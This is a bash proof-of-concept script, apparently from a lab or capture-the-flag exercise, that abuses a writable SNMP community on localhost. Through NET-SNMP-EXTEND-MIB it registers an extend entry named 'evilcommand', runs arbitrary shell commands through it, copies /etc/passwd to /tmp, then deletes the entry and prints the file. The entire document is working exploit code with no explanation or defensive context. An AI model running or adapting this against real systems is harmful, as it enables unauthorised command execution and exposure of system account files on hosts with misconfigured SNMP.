#!/bin/bash

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
    'nsExtendStatus."evilcommand"'  = createAndGo \
    'nsExtendCommand."evilcommand"' = /bin/echo \
    'nsExtendArgs."evilcommand"'    = 'Hello World'

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
    'nsExtendCommand."evilcommand"' = /bin/bash \
    'nsExtendArgs."evilcommand"'    = '-c "cp /etc/passwd /tmp"'

snmpwalk -v2c -c c0nfig localhost nsExtendObjects | grep "evilcommand"

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
    'nsExtendStatus."evilcommand"'  = destroy

cat /tmp/passwd

